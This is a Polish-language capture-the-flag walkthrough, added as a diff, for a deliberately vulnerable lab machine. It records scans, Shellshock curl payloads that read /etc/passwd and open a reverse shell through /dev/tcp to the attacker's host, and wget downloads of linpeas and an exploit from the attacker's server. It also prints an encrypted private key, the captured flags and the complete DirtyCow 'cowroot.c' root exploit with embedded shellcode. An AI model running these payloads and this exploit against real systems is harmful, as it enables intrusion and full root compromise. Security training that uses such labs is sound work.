@@ -1,0 +1,402 @@
+Project 13 - Shellshock
+
+
+*Rekonesans*
+*Skanowanie za pomocą Nmap*
+```
+sudo nmap -sC -sV 10.10.138.214
+```
+```
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-11 13:57 EDT
+Nmap scan report for 10.10.138.214
+Host is up (0.065s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
+|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
+|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
+|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: 0day
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+*Otwarte porty*
+```
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+```
+
+*Enumeracja strony internetowej*
+```
+gobuster dir -u http://10.10.138.214 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
+```
+```
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.138.214
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/10/11 13:59:28 Starting gobuster in directory enumeration mode
+===============================================================
+/cgi-bin              (Status: 301) [Size: 315] [--> http://10.10.138.214/cgi-bin/]
+/img                  (Status: 301) [Size: 311] [--> http://10.10.138.214/img/]    
+/uploads              (Status: 301) [Size: 315] [--> http://10.10.138.214/uploads/]
+/admin                (Status: 301) [Size: 313] [--> http://10.10.138.214/admin/]  
+/css                  (Status: 301) [Size: 311] [--> http://10.10.138.214/css/]    
+/js                   (Status: 301) [Size: 310] [--> http://10.10.138.214/js/]     
+/backup               (Status: 301) [Size: 314] [--> http://10.10.138.214/backup/] 
+/secret               (Status: 301) [Size: 314] [--> http://10.10.138.214/secret/] 
+/server-status        (Status: 403) [Size: 293]                                    
+Progress: 157452 / 220561 (71.39%)                                                [ERROR] 2022/10/11 14:02:55 [!] Get "http://10.10.138.214/nanas": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
+                                                                                   
+===============================================================
+2022/10/11 14:04:21 Finished
+===============================================================
+```
+*Skan Nikto*
+```
+nikto -h http://10.10.138.214
+```
+```
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.138.214
++ Target Hostname:    10.10.138.214
++ Target Port:        80
++ Start Time:         2022-10-11 14:00:46 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.7 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip
++ Uncommon header '93e4r0-cve-2014-6278' found, with contents: true
++ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271).
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3092: /admin/: This might be interesting...
++ OSVDB-3092: /backup/: This might be interesting...
++ OSVDB-3268: /css/: Directory indexing found.
++ OSVDB-3092: /css/: This might be interesting...
++ OSVDB-3268: /img/: Directory indexing found.
++ OSVDB-3092: /img/: This might be interesting...
++ OSVDB-3092: /secret/: This might be interesting...
++ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ /admin/index.html: Admin login page/section found.
++ 8699 requests: 0 error(s) and 18 item(s) reported on remote host
++ End Time:           2022-10-11 14:10:06 (GMT-4) (560 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
+Dzięki temu skanowi pojawia się kilka ukrytych katalogów, które można dalej wyliczyć a także wskazanie, że strona może być podatna na lukę w zabezpieczeniach **"shellshock"**
+```
+OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability (_**[**_http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271_**](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271)**_).
+```
+
+*Enumeracja ukrytych katalogów - przeglądarka internetowa*
+```
+http://10.10.138.214/secret
+http://10.10.138.214/backup
+
+-----BEGIN RSA PRIVATE KEY----- 
+Proc-Type: 4,ENCRYPTED 
+DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
+
+T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8 9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g /5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB 6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6 8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6 oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE 99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P 
+-----END RSA PRIVATE KEY-----
+```
+**Klucza nie udało się złamać**
+
+*Shellshock*
+Sprawdzanie podatności strony na Shellshock
+*Kali Linux*
+```
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.10.138.214//cgi-bin/test.cgi
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+messagebus:x:102:105::/var/run/dbus:/bin/false
+ryan:x:1000:1000:Ubuntu 14.04.1,,,:/home/ryan:/bin/bash
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+```
+
+Można wymienić zawartość pliku **/etc/passwd**. Po prostu używając różnych poleceń systemowych, można dość łatwo wyświetlić zawartość katalogu domowego Ryana.
+*Kali Linux*
+```
+curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/ls -al /home/ryan/' bash -s :'' http://10.10.138.214//cgi-bin/test.cgi
+
+total 28
+drwxr-xr-x 3 ryan ryan 4096 Sep  2  2020 .
+drwxr-xr-x 3 root root 4096 Sep  2  2020 ..
+lrwxrwxrwx 1 ryan ryan    9 Sep  2  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 ryan ryan  220 Sep  2  2020 .bash_logout
+-rw-r--r-- 1 ryan ryan 3637 Sep  2  2020 .bashrc
+drwx------ 2 ryan ryan 4096 Sep  2  2020 .cache
+-rw-r--r-- 1 ryan ryan  675 Sep  2  2020 .profile
+-rw-rw-r-- 1 ryan ryan   22 Sep  2  2020 user.txt
+```
+
+*Odwrócona powłoka za pomocą Shellshock ręcznie*
+*Kali Linux*
+```
+pwncat --listen --port 4444
+
+lub
+
+nc -nvlp 4444
+```
+*Kali Linux*
+```
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/IP Kali Linux/4444 0>&1' http://IP Target/cgi-bin/test.cgi
+```
+
+*Użytkownik www-data*
+```
+cd /home
+cd ryan
+cat user.txt
+THM{Sh3llSh0ck_r0ckz}
+```
+
+**Eskalacja uprawnień**
+*Enumeracja za pomocą LinPeas*
+*Kali Linux*
+```
+python3 -m http.server
+```
+*Target*
+```
+wget http://10.18.105.140:8000/linpeas.sh
+
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+Przeglądając exploita jądra, możemy zobaczyć **CVE-2016-5195**, który jest dirty_cow exploitem.
+```
+[+] [CVE-2016-5195] dirtycow 2
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Exposure: highly probable
+   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
+   Download URL: https://www.exploit-db.com/download/40839
+   ext-url: https://www.exploit-db.com/download/40847
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+```
+*Pobranie skryptu cowroot.c na Kali Linux*
+```
+https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679
+
+Kod:
+
+/*
+* (un)comment correct payload first (x86 or x64)!
+* 
+* $ gcc cowroot.c -o cowroot -pthread
+* $ ./cowroot
+* DirtyCow root privilege escalation
+* Backing up /usr/bin/passwd.. to /tmp/bak
+* Size of binary: 57048
+* Racing, this may take a while..
+* /usr/bin/passwd overwritten
+* Popping root shell.
+* Don't forget to restore /tmp/bak
+* thread stopped
+* thread stopped
+* root@box:/root/cow# id
+* uid=0(root) gid=1000(foo) groups=1000(foo)
+*
+* @robinverton 
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <pthread.h>
+#include <string.h>
+#include <unistd.h>
+
+void *map;
+int f;
+int stop = 0;
+struct stat st;
+char *name;
+pthread_t pth1,pth2,pth3;
+
+// change if no permissions to read
+char suid_binary[] = "/usr/bin/passwd";
+
+/*
+* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
+*/ 
+unsigned char sc[] = {
+  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
+  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
+  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
+  0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
+  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
+};
+unsigned int sc_len = 177;
+
+/*
+* $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
+unsigned char sc[] = {
+  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
+  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
+  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
+  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
+  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
+  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
+  0x89, 0xe1, 0xcd, 0x80
+};
+unsigned int sc_len = 136;
+*/
+
+void *madviseThread(void *arg)
+{
+    char *str;
+    str=(char*)arg;
+    int i,c=0;
+    for(i=0;i<1000000 && !stop;i++) {
+        c+=madvise(map,100,MADV_DONTNEED);
+    }
+    printf("thread stopped\n");
+}
+
+void *procselfmemThread(void *arg)
+{
+    char *str;
+    str=(char*)arg;
+    int f=open("/proc/self/mem",O_RDWR);
+    int i,c=0;
+    for(i=0;i<1000000 && !stop;i++) {
+        lseek(f,map,SEEK_SET);
+        c+=write(f, str, sc_len);
+    }
+    printf("thread stopped\n");
+}
+
+void *waitForWrite(void *arg) {
+    char buf[sc_len];
+
+    for(;;) {
+        FILE *fp = fopen(suid_binary, "rb");
+
+        fread(buf, sc_len, 1, fp);
+
+        if(memcmp(buf, sc, sc_len) == 0) {
+            printf("%s overwritten\n", suid_binary);
+            break;
+        }
+
+        fclose(fp);
+        sleep(1);
+    }
+
+    stop = 1;
+
+    printf("Popping root shell.\n");
+    printf("Don't forget to restore /tmp/bak\n");
+
+    system(suid_binary);
+}
+
+int main(int argc,char *argv[]) {
+    char *backup;
+
+    printf("DirtyCow root privilege escalation\n");
+    printf("Backing up %s to /tmp/bak\n", suid_binary);
+
+    asprintf(&backup, "cp %s /tmp/bak", suid_binary);
+    system(backup);
+
+    f = open(suid_binary,O_RDONLY);
+    fstat(f,&st);
+
+    printf("Size of binary: %d\n", st.st_size);
+
+    char payload[st.st_size];
+    memset(payload, 0x90, st.st_size);
+    memcpy(payload, sc, sc_len+1);
+
+    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
+
+    printf("Racing, this may take a while..\n");
+
+    pthread_create(&pth1, NULL, &madviseThread, suid_binary);
+    pthread_create(&pth2, NULL, &procselfmemThread, payload);
+    pthread_create(&pth3, NULL, &waitForWrite, NULL);
+
+    pthread_join(pth3, NULL);
+
+    return 0;
+}
+```
+*Kompilowanie skryptu*
+```
+gcc cowroot.c -o cowroot -pthread
+```
+
+*Przesłanie pliku cowroot*
+*Kali Linux*
+```
+python3 -m http.server
+```
+*Target*
+```
+cd /tmp
+
+wget http://10.18.105.140:8000/cowroot
+
+chmod +x cowroot.c
+./cowroot.c
+
+cd /root
+cat root.txt
+Flaga: THM{g00d_j0b_0day_is_Pleased}
+```
